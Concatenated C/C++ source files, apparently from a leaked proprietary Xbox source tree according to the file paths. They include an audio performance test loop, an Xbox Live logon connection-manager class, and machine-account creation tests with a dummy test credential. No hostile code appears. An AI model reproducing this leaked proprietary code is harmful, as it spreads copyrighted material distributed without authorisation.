                if (FALSE == DeviceCreateFunctionTable[dwTestIndex].pFunction(hLogAll, DeviceCreateFunctionTable[dwTestIndex].lpszTestName, dwTestIteration, &KernelTime, &InterruptTime, &DpcTime, &IdleTime, &dwNumMicrophoneFailures, &dwNumHeadphoneFailures, DeviceCreateFunctionTable[dwTestIndex].dwNumMicrophones, DeviceCreateFunctionTable[dwTestIndex].dwNumHeadphones)) {
                    goto ExitTest;
                }
            }

            LogStatsSummary(hLogSummary, DeviceCreateFunctionTable[dwTestIndex].lpszTestName, KernelTime, InterruptTime, DpcTime, IdleTime, &dwNumMicrophoneFailures, &dwNumHeadphoneFailures, NULL, NULL, NULL, dwNumIterations);
            LogStatsCsv(hLogDeviceCreateCsv, DeviceCreateFunctionTable[dwTestIndex].lpszTestName, KernelTime, InterruptTime, DpcTime, IdleTime, &dwNumMicrophoneFailures, &dwNumHeadphoneFailures, NULL, NULL, NULL, dwNumIterations);

            dwNumTotalMicrophoneFailures += dwNumMicrophoneFailures;
            dwNumTotalHeadphoneFailures += dwNumHeadphoneFailures;
        }

        dwTableIndex = 1;
    }

    if ((dwNumTables >= dwTableIndex) && (1 == dwTableIndex)) {
        for (dwTestIndex = 0; dwTestIndex < CodecCreateFunctionTableCount; dwTestIndex++) {
            ZeroMemory(&KernelTime, sizeof(KernelTime));
            ZeroMemory(&InterruptTime, sizeof(InterruptTime));
            ZeroMemory(&DpcTime, sizeof(DpcTime));
            ZeroMemory(&IdleTime, sizeof(IdleTime));

            dwNumEncoderFailures = 0;
            dwNumDecoderFailures = 0;
            dwNumQueueFailures = 0;

            for (dwTestIteration = 0; dwTestIteration < dwNumIterations; dwTestIteration++) {
                if (FALSE == CodecCreateFunctionTable[dwTestIndex].pFunction(hLogAll, CodecCreateFunctionTable[dwTestIndex].lpszTestName, dwTestIteration, &KernelTime, &InterruptTime, &DpcTime, &IdleTime, &dwNumEncoderFailures, &dwNumDecoderFailures, &dwNumQueueFailures, CodecCreateFunctionTable[dwTestIndex].dwNumEncoder, CodecCreateFunctionTable[dwTestIndex].dwNumDecoder, CodecCreateFunctionTable[dwTestIndex].dwNumQueue, CodecCreateFunctionTable[dwTestIndex].dwCodecTag, CodecCreateFunctionTable[dwTestIndex].wMsOfDataPerPacket)) {
                    goto ExitTest;
                }
            }

            LogStatsSummary(hLogSummary, CodecCreateFunctionTable[dwTestIndex].lpszTestName, KernelTime, InterruptTime, DpcTime, IdleTime, &dwNumMicrophoneFailures, &dwNumHeadphoneFailures, NULL, NULL, NULL, dwNumIterations);
            LogStatsCsv(hLogCodecCreateCsv, CodecCreateFunctionTable[dwTestIndex].lpszTestName, KernelTime, InterruptTime, DpcTime, IdleTime, &dwNumMicrophoneFailures, &dwNumHeadphoneFailures, NULL, NULL, NULL, dwNumIterations);

            dwNumTotalEncoderFailures += dwNumEncoderFailures;
            dwNumTotalDecoderFailures += dwNumDecoderFailures;
            dwNumTotalQueueFailures += dwNumQueueFailures;
        }

        dwTableIndex = 2;
    }

    if ((dwNumTables >= dwTableIndex) && (2 == dwTableIndex)) {
        for (dwTestIndex = 0; dwTestIndex < MediaProcessFunctionTableCount; dwTestIndex++) {
            ZeroMemory(&KernelTime, sizeof(KernelTime));
            ZeroMemory(&InterruptTime, sizeof(InterruptTime));
            ZeroMemory(&DpcTime, sizeof(DpcTime));
            ZeroMemory(&IdleTime, sizeof(IdleTime));

            dwNumMicrophoneFailures = 0;
            dwNumHeadphoneFailures = 0;
            dwNumEncoderFailures = 0;
            dwNumDecoderFailures = 0;
            dwNumQueueFailures = 0;

            for (dwTestIteration = 0; dwTestIteration < dwNumIterations; dwTestIteration++) {
                if (FALSE == MediaProcessFunctionTable[dwTestIndex].pFunction(hLogAll, hMemObject, MediaProcessFunctionTable[dwTestIndex].lpszTestName, dwTestIteration, &KernelTime, &InterruptTime, &DpcTime, &IdleTime, &dwNumMicrophoneFailures, &dwNumHeadphoneFailures, &dwNumEncoderFailures, &dwNumDecoderFailures, &dwNumQueueFailures, MediaProcessFunctionTable[dwTestIndex].dwNumMicrophones, MediaProcessFunctionTable[dwTestIndex].dwNumHeadphones, MediaProcessFunctionTable[dwTestIndex].dwNumEncoder, MediaProcessFunctionTable[dwTestIndex].dwNumDecoder, MediaProcessFunctionTable[dwTestIndex].dwNumQueue, MediaProcessFunctionTable[dwTestIndex].bMix, MediaProcessFunctionTable[dwTestIndex].dwCodecTag, MediaProcessFunctionTable[dwTestIndex].wNumPackets, MediaProcessFunctionTable[dwTestIndex].wMsOfDataPerPacket)) {
                    goto ExitTest;
                }
            }

            LogStatsSummary(hLogSummary, MediaProcessFunctionTable[dwTestIndex].lpszTestName, KernelTime, InterruptTime, DpcTime, IdleTime, &dwNumMicrophoneFailures, &dwNumHeadphoneFailures, &dwNumEncoderFailures, &dwNumDecoderFailures, &dwNumQueueFailures, dwNumIterations);
            LogStatsCsv(hLogProcessCsv, MediaProcessFunctionTable[dwTestIndex].lpszTestName, KernelTime, InterruptTime, DpcTime, IdleTime, &dwNumMicrophoneFailures, &dwNumHeadphoneFailures, &dwNumEncoderFailures, &dwNumDecoderFailures, &dwNumQueueFailures, dwNumIterations);

            dwNumTotalMicrophoneFailures += dwNumMicrophoneFailures;
            dwNumTotalHeadphoneFailures += dwNumHeadphoneFailures;
            dwNumTotalEncoderFailures += dwNumEncoderFailures;
            dwNumTotalDecoderFailures += dwNumDecoderFailures;
            dwNumTotalQueueFailures += dwNumQueueFailures;
        }

        dwTableIndex = 3;
    }

ExitTest:
    // Log failures
    if (dwNumTables <= dwTableIndex) {
        LogStatsFailures(hLogAll, &dwNumTotalMicrophoneFailures, &dwNumTotalHeadphoneFailures, &dwNumTotalEncoderFailures, &dwNumTotalDecoderFailures, &dwNumTotalQueueFailures, AllFunctionTestCount * dwNumIterations);
        LogStatsFailures(hLogSummary, &dwNumTotalMicrophoneFailures, &dwNumTotalHeadphoneFailures, &dwNumTotalEncoderFailures, &dwNumTotalDecoderFailures, &dwNumTotalQueueFailures, AllFunctionTestCount * dwNumIterations);
    }

    // Flush the file buffers to prevent corruption
    FlushFileBuffers(hLogAll);
    FlushFileBuffers(hLogSummary);
    FlushFileBuffers(hLogDeviceCreateCsv);
    FlushFileBuffers(hLogCodecCreateCsv);
    FlushFileBuffers(hLogProcessCsv);

    // Close the log file
    CloseHandle(hLogAll);
    CloseHandle(hLogSummary);
    CloseHandle(hLogDeviceCreateCsv);
    CloseHandle(hLogCodecCreateCsv);
    CloseHandle(hLogProcessCsv);

    // Free the private heap
    xMemClose(hMemObject);

    XLaunchNewImage(NULL, NULL);

    __asm int 3;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineAuthUtil\CXLiveConnectionManager.h ===
/***************************************************************************
 *
 *  Copyright (C) 2002 by Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       CXLiveConnectionManager.h
 *  Content:    Connection manager class declarations
 *  Owner:      davidhef
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xlog.h>
#include <macros.h>
#include <xonlinep.h>
#include <debug.h>
#include <new.h>


namespace XLive
{

// Forward declare the finalizer.
void __cdecl DestroyCXLiveConnectionManager( void );



class CXLiveConnectionManager
{
    friend void __cdecl DestroyCXLiveConnectionManager( void );
    friend DWORD WINAPI LogonWorkerThreadFunction(void *pArgs);

    // This class is a singleton.
public:
    inline static CXLiveConnectionManager& Instance()
    {
        if (NULL == m_pInstance)
        {
            if (m_bDestroyed)
            {
                HandleDeadReference();
                m_bDestroyed = false;
            }
            else
            {
                // Create for the first time.
                CreateInstance();
            }
        }
        return *m_pInstance;
    }

    HRESULT Logon(XONLINE_USER *pUsers, DWORD dwTimeout = 5000, bool fWaitForConnection = false);
    HRESULT LogonAndWaitForConnection(XONLINE_USER *pUsers, DWORD dwTimeout = 5000);
    HRESULT WaitForConnection();
    HRESULT Logoff();

    HRESULT SelectServices(DWORD svc);
    HRESULT SelectServices(DWORD svc1, DWORD svc2);
    HRESULT SelectServices(DWORD svc1, DWORD svc2, DWORD svc3);
    HRESULT SelectServices(DWORD *pServices, DWORD dwServicesCount);
    inline HRESULT SelectNoServices( void ) { m_pdwServices = NULL; m_dwServicesCount = 0; return S_OK; }

    inline HRESULT GetLogonStatus() const
    {
        if (NULL != m_taskHandle && Ready != m_classState)
        {
            return XOnlineLogonTaskGetResults(m_taskHandle);
        }
        return XONLINE_E_USER_NOT_LOGGED_ON;
    }

private:
    explicit CXLiveConnectionManager()
        :   m_lClassLock(0), m_dwOwningThreadId(0),
            m_logonEventHandle(NULL), m_timeoutHandle(NULL),
            m_taskHandle(NULL),
            m_hWorkerThreadHandle(NULL), m_dwWorkerThreadId(0),
            m_lastHR(S_OK), m_bAbortThread(false),
            m_classState(Ready)
    {
        HRESULT hr = Init();
        AssertSz(S_OK == hr, "Unable to construct XLive::CXLiveConnectionManager!");
    }
    
    ~CXLiveConnectionManager()
    {
        // Kill the worker thread, if it's still alive.
        // However, it should already have been killed
        // by now.
        if (m_dwWorkerThreadId != 0 && m_logonEventHandle != NULL)
        {
            m_bAbortThread = true;
            SetEvent(m_logonEventHandle);
            Sleep(1000);
        }

        (void) CleanupResources();
        m_pInstance = NULL;
        m_bDestroyed = true;
    }

    inline static void CreateInstance()
    {
        static CXLiveConnectionManager connectionMgr;
        new (&connectionMgr) CXLiveConnectionManager;
        m_pInstance = &connectionMgr;
    }

    inline static void HandleDeadReference()
    {
        CreateInstance();
        atexit(DestroyCXLiveConnectionManager);
        m_bDestroyed = false;
    }

    inline CXLiveConnectionManager(CXLiveConnectionManager const &) {}
    inline CXLiveConnectionManager& operator=(CXLiveConnectionManager const &) {}

    HRESULT Init();
    HRESULT CleanupResources();

    inline HRESULT VerifyOwnership();
    HRESULT CreateLogonWorkerThread();
    HRESULT _WaitForConnection();

    static CXLiveConnectionManager  *m_pInstance;
    static bool                     m_bDestroyed;

    bool                        m_bInitialized;     // true, if Init() was successful.
    LONG                        m_lClassLock;       // Synchronizes use of the class.
    DWORD                       m_dwOwningThreadId; // This thread owns the class.

    XONLINE_USER                m_users[XONLINE_MAX_LOGON_USERS];   // Users to log on

    DWORD                       m_dwServices[XONLINE_MAX_NUMBER_SERVICE];   // Used by Logon
    DWORD                       m_dwServicesCount;                          // Used by Logon
    DWORD                       *m_pdwServices;     // Used by Logon

    volatile XONLINETASK_HANDLE m_taskHandle;       // Used by logon task pump

    volatile HANDLE             m_logonEventHandle; // Used by logon task pump.
    volatile HANDLE             m_timeoutHandle;    // Used to timeout logons.

    // The following is the handle to an event that is signalled by the
    // logon worker thread.  The main thread waits for this event when
    // waiting for the worker thread to complete the connection.
    volatile HANDLE             m_mainThreadTimeoutHandle;

    volatile enum{Ready, LoggedOn, Connected}       m_classState;

    // Thread/connection state.
    volatile DWORD              m_dwWorkerThreadId; // When 0, there is no worker thread.
    volatile HANDLE             m_hWorkerThreadHandle;  // Returned by CreateThread.
    volatile HRESULT            m_lastHR;           // The worker thread's hr from XOnlineTaskContinue

    // Worker thread control
    volatile bool               m_bAbortThread;     // Setting this flag terminates the worker thread.

};  // class CXLiveConnectionManager





} // namespace XLive
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineAuthUtil\CXLiveConnectionManager.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2002 by Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       CXLiveConnectionManager.cpp
 *  Content:    Connection manager implementation
 *  Owner:      davidhef
 *
 ****************************************************************************/
#include "CXLiveConnectionManager.h"
#include <new>
#include <debug.h>

namespace XLive
{

// Class static variables
CXLiveConnectionManager *CXLiveConnectionManager::m_pInstance = NULL;
bool CXLiveConnectionManager::m_bDestroyed = false;

    
HRESULT CXLiveConnectionManager::Init()
{
    HRESULT hr = S_OK;

    m_lClassLock = 0;
    m_dwOwningThreadId = 0;
    ZeroMemory(m_users, sizeof(m_users));
    ZeroMemory(m_dwServices, sizeof(m_dwServices));
    m_dwServicesCount = 0;
    m_pdwServices = NULL;
    m_taskHandle = 0;
    m_logonEventHandle = 0;
    m_timeoutHandle = NULL;
    m_mainThreadTimeoutHandle = NULL;
    m_classState = Ready;
    m_dwWorkerThreadId = 0;
    m_hWorkerThreadHandle = 0;
    m_lastHR = E_INVALIDARG;
    m_bAbortThread = false;

    //
    // Acquire needed dynamic resources.
    //
    if (SUCCEEDED(hr))
    {
        m_logonEventHandle = CreateEvent( NULL, FALSE, TRUE, "XOnlineLogonEvent" );
        hr = (NULL == m_logonEventHandle) ? E_FAIL : hr;
    }

    if (SUCCEEDED(hr))
    {
        m_timeoutHandle = CreateWaitableTimer(NULL, TRUE, "LogonTimeoutTimer");
        hr = (NULL == m_timeoutHandle) ? E_FAIL : hr;
    }

    if (SUCCEEDED(hr))
    {
        m_mainThreadTimeoutHandle = CreateEvent( NULL, FALSE, TRUE, NULL );
        hr = (NULL == m_mainThreadTimeoutHandle) ? E_FAIL : hr;
    }

    m_bInitialized = (SUCCEEDED(hr)) ? true : false;

    return hr;
}

HRESULT CXLiveConnectionManager::CleanupResources()
{
    //
    // This function should restore the instance
    // to the same state it was in after construction.
    //

    HRESULT hr = S_OK;

    // Close the events.
    if (NULL != m_logonEventHandle)
    {
        hr = (!CloseHandle(m_logonEventHandle)) ? E_FAIL : hr;
        m_logonEventHandle = (SUCCEEDED(hr)) ? NULL : m_logonEventHandle;
    }
    
    if (NULL != m_mainThreadTimeoutHandle)
    {
        hr = (!CloseHandle(m_mainThreadTimeoutHandle)) ? E_FAIL : hr;
        m_mainThreadTimeoutHandle = (SUCCEEDED(hr)) ? NULL : m_mainThreadTimeoutHandle;
    }

    // Close the Logon task.
    if (NULL != m_taskHandle)
    {
        hr = (SUCCEEDED(XOnlineTaskClose(m_taskHandle))) ? hr : E_FAIL;
        m_taskHandle = (SUCCEEDED(hr)) ? NULL : m_taskHandle;
    }

    // Close the worker thread handle.
    if (NULL != m_hWorkerThreadHandle)
    {
        hr = (!CloseHandle(m_hWorkerThreadHandle)) ? E_FAIL : hr;
        m_hWorkerThreadHandle = (SUCCEEDED(hr)) ? NULL : m_hWorkerThreadHandle;
    }

    // Close the timeout timer handle.
    if (NULL != m_timeoutHandle)
    {
        hr = (!CloseHandle(m_timeoutHandle)) ? E_FAIL : hr;
        m_timeoutHandle = (SUCCEEDED(hr)) ? NULL : m_timeoutHandle;
    }

    m_bInitialized = false;

    return hr;
}

inline HRESULT CXLiveConnectionManager::VerifyOwnership()
{
    // Assume that the class is already locked.
    AssertSz(m_dwOwningThreadId == GetCurrentThreadId(), "Another thread is using the connection manager!");
    if (m_dwOwningThreadId == 0)
    {
        // Take ownership.
        m_dwOwningThreadId = GetCurrentThreadId();
    }

    return (m_dwOwningThreadId == GetCurrentThreadId()) ? S_OK : E_FAIL;
}

HRESULT CXLiveConnectionManager::Logon(XONLINE_USER *pUsers, DWORD dwTimeout, bool fWaitForConnection)
{
    while (InterlockedCompareExchange(&m_lClassLock, 1L, 0L))
    {
        Sleep(0);
    }
    
    HRESULT hr = S_OK;

    if (SUCCEEDED(hr))
    {
        // Only 1 thread is allowed to use this singleton.
        hr = VerifyOwnership();
    }

    hr = (m_classState == Ready) ? S_OK : E_FAIL;

    // Reset the event that we will wait for when we are called with fWaitForConnection == true.
    if (SUCCEEDED(hr))
    {
        hr = (TRUE == ResetEvent(m_mainThreadTimeoutHandle)) ? S_OK : E_FAIL;
    }

    if (SUCCEEDED(hr))
    {
        hr = XOnlineLogon(pUsers, m_pdwServices, m_dwServicesCount, m_logonEventHandle, (PXONLINETASK_HANDLE) &m_taskHandle);
        m_lastHR = hr;
    }

    // Decode the return code.
    switch (hr)
    {
    case XONLINE_E_LOGON_SERVICE_UNAVAILABLE:
    case XONLINE_E_LOGON_CONNECTION_LOST:
    case XONLINE_E_LOGON_UPDATE_REQUIRED:
    case XONLINE_E_LOGON_XBOX_ACCOUNT_INVALID:
    case XONLINE_E_LOGON_USER_ACCOUNT_INVALID:
    case XONLINE_E_LOGON_NO_SUBSCRIPTION:
        {
            break;
        }
    case S_OK:
        {
            // This is what we expect to get back from XOnlineLogon().
            // The logon is incomplete, but, so far, successful.
            break;
        }
    default:
        {
            break;
        }
    }

    if (SUCCEEDED(hr))
    {
        // Create a worker thread to pump the task.
        hr = CreateLogonWorkerThread();
    }
    
    if (SUCCEEDED(hr))
    {
        // Convert the timeout into an absolute time.
        FILETIME fileTime;
        GetSystemTimeAsFileTime(&fileTime);
        ULARGE_INTEGER ulInt;
        Assert(sizeof(ulInt) == sizeof(fileTime));
        memcpy(&ulInt, &fileTime, sizeof(ulInt));
        __int64 qInt = ulInt.QuadPart;
        qInt += (__int64) (10000000 * dwTimeout);

        // Set the timeout timer.
        if (!SetWaitableTimer(  m_timeoutHandle,
                                (const LARGE_INTEGER *) &qInt,
                                0L,
                                NULL,
                                NULL,
                                FALSE))
        {
            hr = E_FAIL;
        }
    }

    if (SUCCEEDED(hr))
    {
        hr = (ResumeThread(m_hWorkerThreadHandle) != -1) ? S_OK : E_FAIL;
    }

    if (FAILED(hr))
    {
        // Clean up resources and return the instance to pristine state, so
        // that it can be called again.
        (void) DestroyCXLiveConnectionManager();
    }
    else
    {
        // We succeeded.  The logon is now being processed by the
        // worker thread.
        m_classState = LoggedOn;
    }

    if (SUCCEEDED(hr) && fWaitForConnection)
    {
        hr = _WaitForConnection();
    }

    // Release the lock.
    m_lClassLock = 0;

    return hr;
}

HRESULT CXLiveConnectionManager::LogonAndWaitForConnection(XONLINE_USER *pUsers, DWORD dwTimeout)
{
    return Logon(pUsers, dwTimeout, true);
}
    
HRESULT CXLiveConnectionManager::_WaitForConnection()
{
    DWORD dwWait = WaitForSingleObject(m_mainThreadTimeoutHandle, INFINITE);
    if (dwWait != WAIT_OBJECT_0)
    {
        return E_FAIL;
    }
    return m_lastHR;
}

HRESULT CXLiveConnectionManager::WaitForConnection()
{
    while (InterlockedCompareExchange(&m_lClassLock, 1L, 0L))
    {
        Sleep(0);
    }
    
    HRESULT hr = VerifyOwnership();

    if (SUCCEEDED(hr))
    {
        hr = _WaitForConnection();
    }
    
    // Release the lock.
    m_lClassLock = 0;

    return hr;
}

    
HRESULT CXLiveConnectionManager::Logoff()
{
    while (InterlockedCompareExchange(&m_lClassLock, 1L, 0L))
    {
        Sleep(0);
    }
    
    HRESULT hr = VerifyOwnership();

    if (SUCCEEDED(hr))
    {
        switch (m_classState)
        {
        case Ready:
            {
                // No user is logged on.
                hr = XONLINE_E_USER_NOT_LOGGED_ON;
                break;
            }
        case LoggedOn:
            {
                // The logon is currently proceding, but has not yet produced
                // a connection, so we'll wait for a connection, before
                // allowing the logoff.
                hr = _WaitForConnection();
                hr = (XONLINE_S_LOGON_CONNECTION_ESTABLISHED == hr && Connected == m_classState) ? S_OK : E_FAIL;
                if (FAILED(hr))
                {
                    break;
                }
                // The state just changed from LoggedOn to Connected.
                // Fall through to handle the Connected state.
            }
        case Connected:
            {
                // This is the expected state.
                hr = S_OK;
                break;
            }
        default:
            {
                // Should never get here!
                __assume(0);
            }
        }
    }

    if (SUCCEEDED(hr))
    {
        // Cause the worker thread to terminate cleanly.
        m_bAbortThread = true;
        if (NULL != m_logonEventHandle)
        {
            (void) SetEvent(m_logonEventHandle);
            Sleep(0);
        }
        
        // Reinitialize the instance.
        DestroyCXLiveConnectionManager();
    }
    
    // Release the lock.
    m_lClassLock = 0;
    
    return hr;
}
    
DWORD WINAPI LogonWorkerThreadFunction(void *pArgs)
{
    DWORD dwWait = 0;
    HRESULT hr = S_OK;

    // Return the threadId so that the other thread can tell that we are alive.
    CXLiveConnectionManager::Instance().m_dwWorkerThreadId = GetCurrentThreadId();

    // Set up the WaitForMultipleObjectsEx() call.
    HANDLE handles[2];
    handles[0] = CXLiveConnectionManager::Instance().m_timeoutHandle;
    handles[1] = CXLiveConnectionManager::Instance().m_logonEventHandle;
    
    do
    {
        if (CXLiveConnectionManager::Instance().m_bAbortThread)
        {
            // Terminate this worker thread.  We won't set hr to E_ABORT,
            // because we want to return only what XOnlineTaskContinue() returned.
            CXLiveConnectionManager::Instance().m_bAbortThread = false;
            break;
        }
        
        dwWait = WaitForMultipleObjectsEx(  (DWORD)2,
                                            &handles[0],
                                            FALSE,
                                            INFINITE,
                                            TRUE);  

        if (CXLiveConnectionManager::Instance().m_bAbortThread)
        {
            // Terminate this worker thread.  We won't set hr to E_ABORT,
            // because we want to return only what XOnlineTaskContinue() returned.
            CXLiveConnectionManager::Instance().m_bAbortThread = false;
            break;
        }
        
        if (dwWait == WAIT_OBJECT_0 + 0)
        {
            // The logon has timed out.
            hr = (TRUE == SetEvent(CXLiveConnectionManager::Instance().m_mainThreadTimeoutHandle)) ? XONLINE_E_LOGON_SERVICE_UNAVAILABLE : E_FAIL;

            // Return the hr, so that the title (other thread) can get it.
            CXLiveConnectionManager::Instance().m_lastHR = hr;
        }
        
        if (SUCCEEDED(hr))
        {
            // Pump the handle.
            hr = XOnlineTaskContinue( CXLiveConnectionManager::Instance().m_taskHandle );
            
            // Return the hr, so that the title (other thread) can get it.
            CXLiveConnectionManager::Instance().m_lastHR = hr;
            
            // Decode the HRESULT.
            switch (hr)
            {
            case XONLINE_E_LOGON_SERVICE_UNAVAILABLE:
            case XONLINE_E_LOGON_NO_DNS_SERVICE:
            case XONLINE_E_LOGON_NO_IP_ADDRESS:
                {
                    // Return hr and terminate the thread.
                    CXLiveConnectionManager::Instance().m_lastHR = hr;
                    SetEvent(CXLiveConnectionManager::Instance().m_mainThreadTimeoutHandle);
                    break;
                }
            case XONLINETASK_S_RUNNING:
                {
                    continue;
                }
            case XONLINE_S_LOGON_CONNECTION_ESTABLISHED:
                {
                    CXLiveConnectionManager::Instance().m_classState = CXLiveConnectionManager::Connected;
                    hr = (TRUE == SetEvent(CXLiveConnectionManager::Instance().m_mainThreadTimeoutHandle)) ? S_OK : E_FAIL;
                    continue;
                }
            default:
                {
                    break;
                }
            }
        }
    } while (SUCCEEDED(hr));
    
    // Prepare to terminate the thread.
    CXLiveConnectionManager::Instance().m_dwWorkerThreadId = 0;
    DWORD dwExitCode = (DWORD) hr;
    ExitThread(dwExitCode);
}

HRESULT CXLiveConnectionManager::CreateLogonWorkerThread()
{
    HRESULT hr = S_OK;
    DWORD dwThreadId = 0;

    if (SUCCEEDED(hr))
    {
        m_hWorkerThreadHandle = CreateThread(
                                                NULL,
                                                8192,
                                                (LPTHREAD_START_ROUTINE) LogonWorkerThreadFunction,
                                                NULL,
                                                CREATE_SUSPENDED,
                                                &dwThreadId);
        hr = (m_hWorkerThreadHandle == NULL) ? E_FAIL : S_OK;
    }

    if (SUCCEEDED(hr))
    {
        hr = (TRUE == SetThreadPriority(m_hWorkerThreadHandle, THREAD_PRIORITY_ABOVE_NORMAL)) ? S_OK : E_FAIL;
    }

    return hr;
}

HRESULT CXLiveConnectionManager::SelectServices(DWORD svc)
{
    while (InterlockedCompareExchange(&m_lClassLock, 1L, 0L))
    {
        Sleep(0);
    }
    
    HRESULT hr = VerifyOwnership();
    
    hr = (Ready == m_classState) ? hr : E_FAIL;
    
    if (SUCCEEDED(hr))
    {
        m_dwServicesCount = 0;
        m_dwServices[m_dwServicesCount++] = svc;
        m_pdwServices = &m_dwServices[0];
    }
    
    // Release the lock.
    m_lClassLock = 0;

    return hr;
}

HRESULT CXLiveConnectionManager::SelectServices(DWORD svc1, DWORD svc2)
{
    while (InterlockedCompareExchange(&m_lClassLock, 1L, 0L))
    {
        Sleep(0);
    }
    
    HRESULT hr = VerifyOwnership();
    
    hr = (Ready == m_classState) ? hr : E_FAIL;
    
    if (SUCCEEDED(hr))
    {
        m_dwServicesCount = 0;
        m_dwServices[m_dwServicesCount++] = svc1;
        m_dwServices[m_dwServicesCount++] = svc2;
        m_pdwServices = &m_dwServices[0];
    }
    
    // Release the lock.
    m_lClassLock = 0;

    return hr;
}

HRESULT CXLiveConnectionManager::SelectServices(DWORD svc1, DWORD svc2, DWORD svc3)
{
    while (InterlockedCompareExchange(&m_lClassLock, 1L, 0L))
    {
        Sleep(0);
    }
    
    HRESULT hr = VerifyOwnership();

    hr = (Ready == m_classState) ? hr : E_FAIL;
    
    if (SUCCEEDED(hr))
    {
        m_dwServicesCount = 0;
        m_dwServices[m_dwServicesCount++] = svc1;
        m_dwServices[m_dwServicesCount++] = svc2;
        m_dwServices[m_dwServicesCount++] = svc3;
        m_pdwServices = &m_dwServices[0];
    }
    
    // Release the lock.
    m_lClassLock = 0;

    return hr;
}

HRESULT CXLiveConnectionManager::SelectServices(DWORD *pServices, DWORD dwServicesCount)
{
    HRESULT hr = S_OK;

    if (dwServicesCount < 0 || dwServicesCount >= XONLINE_MAX_NUMBER_SERVICE)
    {
        hr = E_INVALIDARG;
    }

    if (SUCCEEDED(hr))
    {
        while (InterlockedCompareExchange(&m_lClassLock, 1L, 0L))
        {
            Sleep(0);
        }
        
        hr = VerifyOwnership();
        
        if (SUCCEEDED(hr))
        {
            hr = (Ready == m_classState) ? hr : E_FAIL;
        }
        
        if (SUCCEEDED(hr))
        {
            if (dwServicesCount == 0)
            {
                m_pdwServices = NULL;
                m_dwServicesCount = 0;
            }
            else
            {
                m_dwServicesCount = dwServicesCount;
                m_pdwServices = &m_dwServices[0];
                memcpy(m_pdwServices, pServices, m_dwServicesCount * sizeof(DWORD));
            }
        }
        
        // Release the lock.
        m_lClassLock = 0;
    }
    
    return hr;
}


//
/////////////////////////////////////////////////////////
//

void __cdecl DestroyCXLiveConnectionManager( void )
{
    CXLiveConnectionManager::Instance().~CXLiveConnectionManager();
}


    
}   // namespace XLive
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineCreateMachineAccount\XOnlineCreateMachineAccount.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineCreateMachineAccount.cpp
 *  Content:    XOnlineCreateMachineAccount tests
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/22/01    danrose Created to test Xbox XOnlineCreateMachineAccount
 *
 ****************************************************************************/

#include "XOnlineCreateMachineAccount.h"

//@@@ drm: XOnlineCreateMachineAccount no longer exists
#define XOnlineCreateMachineAccount() (E_FAIL)

/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

extern HANDLE g_hLog;

/****************************************************************************
 *
 *  XOnlineCreateMachineAccount_ValidAccountNoInternet
 *
 *	Description:
 *		Try to create a machine account on an xbox that has a 
 *		valid machine account and is not connected to the internet
 *
 *	Input: 
 *		None
 *
 *	System State:
 *		Account exists: TRUE
 *		Account valid: TRUE
 *		Connected to internet: FALSE
 *
 *	Verify: 
 *		Return code is NOT S_OK
 *		Old account exists
 *		Old account is not modified
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineCreateMachineAccount_ValidAccountNoInternet( void )
{
    HRESULT             hr              = S_OK;

	//
	// create a temp devkit machine acount
	//

	CHECKRUN( CreateMachineAccount() );

	//
	// Create the machine Account
	//

	CHECKRUN( SUCCEED_ON_FAIL( XOnlineCreateMachineAccount(), 0xc000005e ) );

	//
	// verify a machine account exists
	//

	CHECKRUNBOOL( _XOnlineHasMachineAccount() );

	//
	// verify the account that exists is the old account
	//

	CHECKRUNBOOL( VerifyMachineAccount( 1, "SN999999999999@machines.xbox.com", "PASSWORD" ) );

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlineCreateMachineAccount_ValidAccountHasInternet
 *
 *	Description:
 *		Try to create a machine account on an xbox that has a 
 *		valid machine account and is connected to the internet
 *
 *	Input: 
 *		None
 *
 *	System State:
 *		Account exists: TRUE
 *		Account valid: TRUE
 *		Connected to internet: TRUE
 *
 *	Verify: 
 *		Return code is NOT S_OK
 *		Old account exists
 *		Old account is not modified
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineCreateMachineAccount_ValidAccountHasInternet( void )
{
    HRESULT             hr              = S_OK;

	//
	// start the network
	//

	CHECKRUN( StartNetwork() );

	//
	// create a temp devkit machine acount
	//

	CHECKRUN( CreateMachineAccount() );

	//
	// Create the machine Account
	//

	CHECKRUN( XOnlineCreateMachineAccount() );

	//
	// verify a machine account exists
	//

	CHECKRUNBOOL( XOnlineHasMachineAccount() );

	//
	// verify the account that exists is the old account
	//

	CHECKRUNBOOL( !VerifyMachineAccount( 1, "SN999999999999@machines.xbox.com", "PASSWORD" ) );

	//
	// close the network
	//

	CloseNetwork();

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlineCreateMachineAccount_NoAccountNoInternet
 *
 *	Description: 
 *		Create a machine account on an xbox that has no 
 *		machine account and is not connected to the internet
 *
 *	Input: 
 *		None
 *
 *	System State:
 *		Account exists: FALSE
 *		Account valid: N/A
 *		Connected to internet: FALSE
 *
 *	Verify: 
 *		Return code is NOT S_OK
 *		No account exists
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineCreateMachineAccount_NoAccountNoInternet( void )
{
    HRESULT             hr              = S_OK;

	//
	// Erase the machine acount
	//

	CHECKRUN( RemoveMachineAccount() );

	//
	// Create the machine Account
	//

	CHECKRUN( SUCCEED_ON_FAIL( XOnlineCreateMachineAccount(), 0xc000005e ) );

	//
	// verify a machine account exists
	//

	CHECKRUNBOOL( ! XOnlineHasMachineAccount() );

    //
    // Return the Hresult
    //

    return hr;
}

